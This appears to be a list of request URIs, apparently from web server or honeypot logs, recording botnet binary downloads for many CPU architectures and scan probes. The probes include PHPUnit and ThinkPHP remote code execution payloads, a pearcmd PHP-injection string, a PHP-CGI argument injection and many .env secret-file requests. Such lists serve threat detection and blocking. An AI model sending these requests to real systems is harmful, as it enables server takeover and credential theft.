URI: /yakuza.mips
URI: /yakuza.arm4
URI: /yakuza.m68k
URI: /yakuza.ppc
URI: /mirai.mpsl
URI: /bins.sh
URI: /mirai.ppc
URI: /arm61
URI: /dc
URI: /scar
URI: /bin.mipsel
URI: /bin.m68k
URI: /bin.i586
URI: /bin.armv5l
URI: /bin.mips
URI: /bin.sh4
URI: /bin.x86_64
URI: /bin.armv4l
URI: /bin.armv7l
URI: /bin.armv6l
URI: /blink
URI: /roze.x86
URI: /roze.i586
URI: /.Sm68k
URI: /.Smips
URI: /roze.ppc
URI: /roze.sh4
URI: /roze.m68k
URI: /roze.armv4
URI: /.Ssh4
URI: /roze.mips
URI: /roze.armv5
URI: /roze.armv6
URI: /roze.i686
URI: /roze.mipsel
URI: /bin.i686
URI: /roze.sparc
URI: /redtail.x86_64
URI: /sora.spc
URI: /sora.arm
URI: /db0fa4b8db0333367e9bda3ab68b8042.ppc
URI: /db0fa4b8db0333367e9bda3ab68b8042.mpsl
URI: /db0fa4b8db0333367e9bda3ab68b8042.x86
URI: /db0fa4b8db0333367e9bda3ab68b8042.m68k
URI: /db0fa4b8db0333367e9bda3ab68b8042.spc
URI: /db0fa4b8db0333367e9bda3ab68b8042.mips
URI: /db0fa4b8db0333367e9bda3ab68b8042.arm7
URI: /db0fa4b8db0333367e9bda3ab68b8042.arm
URI: /db0fa4b8db0333367e9bda3ab68b8042.arm5
URI: /db0fa4b8db0333367e9bda3ab68b8042.i686
URI: /db0fa4b8db0333367e9bda3ab68b8042.sh4
URI: /db0fa4b8db0333367e9bda3ab68b8042.arm6
URI: /db0fa4b8db0333367e9bda3ab68b8042.arc
URI: /earc
URI: /ex86
URI: /bot.spc
URI: /qkbfi86
URI: /boatnet.x86_64
URI: /boatnet.i686
URI: /cron
URI: /bash
URI: /ntpd
URI: /wget
URI: /openssh
URI: /ftp
URI: /apache2
URI: /pftp
URI: /sshd
URI: /sh
URI: /t
URI: /tarm6
URI: /tarm
URI: /tsh4
URI: /tarm5
URI: /tmpsl
URI: /tppc
URI: /tarm7
URI: /tspc
URI: /a
URI: /bolubotnetm68k
URI: /bolubotnetx86
URI: /bolubotnetarm5
URI: /bolubotnetarm6
URI: /bolubotnetarm7
URI: /bolubotnetarm
URI: /bolubotnetmips
URI: /bolubotnetx86_64
URI: /bolubotnetmpsl
URI: /bolubotnetsh4
URI: /bolubotnetppc
URI: /.i
URI: /nullnet_load.arm
URI: /nullnet_load.arm7
URI: /i6
URI: /runtime
URI: /xd.mpsl
URI: /xd.arm5
URI: /xd.m68k
URI: /xd.arm
URI: /xd.arm6
URI: /xd.mips
URI: /xd.sh4
URI: /xd.ppc
URI: /xd.x86
URI: /xd.arm7
URI: /rebirth.mips
URI: /rebirth.arm6
URI: /rebirth.i686
URI: /rebirth.arm5
URI: /rebirth.m68
URI: /rebirth.mpsl
URI: /.Sarm
URI: /skid.arm6
URI: /zte
URI: /acmips
URI: /acarm7
URI: /acarm5
URI: /acmipsel
URI: /firmware.mips
URI: /firmware.mipsel
URI: /firmware.x86_64
URI: /firmware.armv5l
URI: /firmware.armv4l
URI: /firmware.arc
URI: /firmware.armv6l
URI: /firmware.armv7l
URI: /firmware.sh4
URI: /r
URI: /go.sh
URI: /.Sppc
URI: /.Sarm5
URI: /.Smpsl
URI: /.Sarm6
URI: /.Sarm7
URI: /.Sx86_64
URI: /.Sspc
URI: /.Sx86
URI: /sh4.nn
URI: /server
URI: /fjwwofba5
URI: /wriww68k
URI: /dwhdbg
URI: /x-3.2-.Sakura
URI: /goahead
URI: /m68k.nn
URI: /tel.arm7
URI: /tel.arm6
URI: /tel.arm
URI: /tel.x86
URI: /tel.arm5
URI: /tel.mpsl
URI: /tel.mips
URI: /lol
URI: /sparc.nn
URI: /powerpc.nn
URI: /0daympsl
URI: /earm6
URI: /c.sh
URI: /w.sh
URI: /b
URI: /panax86
URI: /jbrute
URI: /2023
URI: /mig
URI: /ps2
URI: /fdgsfg
URI: /bx
URI: /gocl
URI: /multi
URI: /k.sh
URI: /weed
URI: /ipc
URI: /adb
URI: /aaa
URI: /z.sh
URI: /jaws
URI: /zz
URI: /fb
URI: /f5
URI: /mag
URI: /av.sh
URI: /li
URI: /ruck
URI: /sd
URI: /lll
URI: /irz
URI: /vc
URI: /xaxa
URI: /g
URI: /toto
URI: /asd
URI: /test.sh
URI: /linksys
URI: /hoho.arm
URI: /hoho.x86
URI: /hoho.sh4
URI: /hoho.arm7
URI: /hoho.mips
URI: /hoho.ppc
URI: /hoho.m68k
URI: /hoho.arm5
URI: /hoho.mpsl
URI: /hoho.arm6
URI: /Aqua.arm6
URI: /Aqua.arm5
URI: /Aqua.mips
URI: /Aqua.arm7
URI: /Aqua.x86
URI: /Aqua.mpsl
URI: /Aqua.arm4
URI: /rebirth.arm4t
URI: /386
URI: /linux
URI: /zmap.mips
URI: /zmap.x86_64
URI: /zmap.arm7
URI: /zmap.x86
URI: /zmap.arm6
URI: /zmap.spc
URI: /zmap.m68k
URI: /zmap.arm
URI: /zmap.ppc
URI: /zmap.mpsl
URI: /zmap.arm5
URI: /zmap.sh4
URI: /custom.spc
URI: /updates.mpsl
URI: /miraint.arm7
URI: /updates.spc
URI: /updates.ppc
URI: /updates.m68k
URI: /updates.sh4
URI: /updates.arm6
URI: /updates.arm7
URI: /updates.arm5
URI: /updates.arc
URI: /updates.i686
URI: /updates.arm
URI: /updates.x86
URI: /updates.mips
URI: /xd.spc
URI: /KKveTTgaAAsecNNaaaa.sh4
URI: /KKveTTgaAAsecNNaaaa.i686
URI: /KKveTTgaAAsecNNaaaa.arm
URI: /KKveTTgaAAsecNNaaaa.ppc
URI: /KKveTTgaAAsecNNaaaa.mpsl
URI: /KKveTTgaAAsecNNaaaa.i486
URI: /KKveTTgaAAsecNNaaaa.m68k
URI: /KKveTTgaAAsecNNaaaa.x86_64
URI: /KKveTTgaAAsecNNaaaa.mips
URI: /KKveTTgaAAsecNNaaaa.x86
URI: /KKveTTgaAAsecNNaaaa.arm7
URI: /KKveTTgaAAsecNNaaaa.spc
URI: /KKveTTgaAAsecNNaaaa.arm6
URI: /KKveTTgaAAsecNNaaaa.arc
URI: /KKveTTgaAAsecNNaaaa.arm5
URI: /s
URI: /f
URI: /darm
URI: /darm6
URI: /darm5
URI: /zte.arm7
URI: /tarc
URI: /darm7
URI: /botnt.mpsl
URI: /botnt.arm5
URI: /aisuru.arm5
URI: /aisuru.arm
URI: /botnt.arm7
URI: /aisuru.i586
URI: /botnt.mips
URI: /aisuru.ppc
URI: /aisuru.i686
URI: /aisuru.arm7
URI: /botnt.arm
URI: /botnt.armv7v5
URI: /aisuru.mpsl
URI: /gx86
URI: /pov
URI: /j
URI: /r.sh
URI: /h
URI: /t.sh
URI: /tenda.sh
URI: /gg
URI: /lil
URI: /Aqua.sh4
URI: /Aqua.ppc
URI: /Aqua.x86_64
URI: /Aqua.m68k
URI: /skid.mips
URI: /c.x86
URI: /miraint.mips
URI: /aodpash4
URI: /dmlsaa5
URI: /okgsdbg
URI: /vsos68k
URI: /vsjsjpc
URI: /lkssn686
URI: /sngosia7
URI: /fosfsa4
URI: /kjnfvaa6
URI: /Aqua.dbg
URI: /Aqua.i686
URI: /jafjn64
URI: /sjfudps
URI: /anfoa86
URI: /ysjssl
URI: /Aqua.86
URI: /firmware.i586
URI: /firmware.i686
URI: /firmware.powerpc
URI: /firmware.m68k
URI: /firmware.sparc
URI: /c.arm
URI: /c.arm6
URI: /c.arm7
URI: /c.arm5
URI: /c.m68k
URI: /c.mpsl
URI: /c.mips
URI: /c.ppc
URI: /c.spc
URI: /x-8.6-.ISIS
URI: /firmware.arm-linux-gnueabihf
URI: /create.py
URI: /sdt
URI: /miraint.spc
URI: /miraint.mpsl
URI: /miraint.sh4
URI: /miraint.m68k
URI: /miraint.arm
URI: /miraint.ppc
URI: /mirai.gnueabihf
URI: /miraint.arm5n
URI: /mirai.arm5n
URI: /best.ppc
URI: /best.arm
URI: /best.arm4
URI: /best.x86
URI: /best.arm5
URI: /best.mips
URI: /best.mpsl
URI: /best.arm7
URI: /arm5n
URI: /aisuru.aarch64
URI: /cyber-ppc
URI: /cyber-arm4
URI: /cyber-arm6
URI: /cyber-arm7
URI: /cyber-x86
URI: /cyber-mips
URI: /cyber-arm5
URI: /cyber-sh4
URI: /cyber-m68k
URI: /cyber-mpsl
URI: /mirai.armv4l
URI: /mirai.bin
URI: /mirai.arc
URI: /mirai.x86_64
URI: /mirai.powerpc
URI: /mirai.mipsel
URI: /botx.arm6
URI: /botx.x86
URI: /botx.mips
URI: /botx.arm5
URI: /botx.m68k
URI: /botx.sh4
URI: /botx.ppc
URI: /botx.mpsl
URI: /botx.arm
URI: /botx.spc
URI: /mirai.i586
URI: /mirai.sparc
URI: /mirai.i686
URI: /skid.mpsl
URI: /iUeQQNFZ9vwOLXIBiZ4156FCf1nexMVYnW
URI: /lleJwlAImyqhwZhZbB4dwBpBt4quciaLIx
URI: /oFcmE1FgKhne42UgV8PwFKEfPr8uhc21Zt
URI: /jOjCsc6Lb1rfzqKpKE3ERtlNUMhVHKezYs
URI: /iR8yH0i1CmTagbpd5LAkUyKPelq5OSIWoO
URI: /gJ6oXExmNUtJlKPCezUadEGTjUqWrrQ4Yt
URI: /Vagi7meiueBttLimeY0QohYvyNii9y4zMR
URI: /ggIPjWoiO55CN4uLVMsA2oFwFP7Fau1TaI
URI: /2qwYcUyrntHY24EcShZNxGEQajLpAzKO5c
URI: /BOBYOkW9NldfT5hBXi13puYhvLpwLH5Z4m
URI: /2Bs8JFpFOqBiXgfSVDNolN4qmaxmtBrJlm
URI: /q24SnZsLiPrkf7mgfxxwiPjZ5o2OXBksEW
URI: /6mXYDuVjkYQ1THGXik9a0pAAofy3U2Zedb
URI: /G7ulzVjYC59VOtF7T9QRQXEtGjH8ckO0Nx
URI: /mirai.arm5l
URI: /mirai.arm6l
URI: /mirai.arm7l
URI: /4GjvJv2WsEeK4KTW0T7MoUu6GFrVlEyqys
URI: /2cpQFAm7HV04FsKexa9uMBzKlDGABg5fBT
URI: /o1KlQxcBl3RfqQL7zG2YMZChDur2XyW7rZ
URI: /zTaBQw506jGO33uhyBoSdNcgv09WUPD8Y8
URI: /wbAWQYT0xzzpN2gPgC6tPXwKDAmspSLk3G
URI: /rTXnteGnn93dfOstrEOasxXXqGQ2rInU61
URI: /gGJIqCld032lUfErvEnt9mwuLIMjt1yOTS
URI: /rZ3aQaDA4r95eJhrZbpBjl8FvbP77WccK6
URI: /xq4zikwLeks9Xjz1V3aU1JS889foqeBjys
URI: /R47OpVdwilbnyY6yCcL0KWNQs1oYCjOuPe
URI: /clbvJjUAuql4HKwTEUnbimMOyxEzGr8CX7
URI: /bpJncUEIUmAgsWjqraqMMn5GluYkLUoPuW
URI: /8vEmyqB6zPykzUL4el08zYwL60DpfB6iNy
URI: /caak72W97tDc3EghxgOox2pYD4rZXRr9YX
URI: /Ares.arm
URI: /Ares.arm7
URI: /botx.arm7
URI: /noob.mips
URI: /noob.x86
URI: /noob.armn
URI: /noob.arm4
URI: /noob.arm7
URI: /noob.arm5
URI: /noob.ppc
URI: /noob.mpsl
URI: /curl
URI: /o
URI: /form.html
URI: /upl.php
URI: /t4
URI: /geoip/
URI: /1.php
URI: /systembc/password.php
URI: /password.php
URI: /geoserver/web/
URI: /portal/redlion
URI: /.env
URI: /actuator/gateway/routes
URI: /.env
URI: /.env
URI: /.env
URI: /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
URI: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
URI: /vendor/phpunit/src/Util/PHP/eval-stdin.php
URI: /vendor/phpunit/Util/PHP/eval-stdin.php
URI: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
URI: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /phpunit/phpunit/Util/PHP/eval-stdin.php
URI: /phpunit/src/Util/PHP/eval-stdin.php
URI: /phpunit/Util/PHP/eval-stdin.php
URI: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
URI: /lib/phpunit/src/Util/PHP/eval-stdin.php
URI: /lib/phpunit/Util/PHP/eval-stdin.php
URI: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
URI: /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
URI: /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
URI: /index.php?lang=../../../../../../../../tmp/index1
URI: /containers/json
URI: /js/DeviceManager.js
URI: /.env
URI: /whturk/.env
URI: /staging.env
URI: /ubuntu/.env
URI: /prisma/.env
URI: /travis/.env
URI: /secret/.env
URI: /parity/.env
URI: /addons/.env
URI: /secure/.env
URI: /module/.env
URI: /widget/.env
URI: /drupal/.env
URI: /kibana/.env
URI: /jsrelay/.env
URI: /layouts/.env
URI: /website/.env
URI: /plugins/.env
URI: /profile/.env
URI: /oldsite/.env
URI: /webroot/.env
URI: /sistema/.env
URI: /ikiwiki/.env
URI: /twitter/.env
URI: /widgets/.env
URI: /monerod/.env
URI: /outputs/.env
URI: /classes/.env
URI: /fileweb/.env
URI: /Backend/.env
URI: /sendgrid/.env
URI: /dotfiles/.env
URI: /profiles/.env
URI: /examples/.env
URI: /var/backup/.env
URI: /lib64/.env
URI: /2024/.env
URI: /_profiler/empty/search/results
URI: /hudson
URI: /sitemap.xml
URI: /robots.txt
URI: /Public/home/js/check.js
URI: /aaa9
URI: /aab9
URI: /.env
URI: /boaform/admin/formLogin
URI: /form.html
URI: /upl.php
URI: /t4
URI: /geoip/
URI: /1.php
URI: /systembc/password.php
URI: /password.php
URI: /.env
URI: /manager/text/list
URI: /HNAP1/
URI: /public/nicolo
URI: /public/nicolo
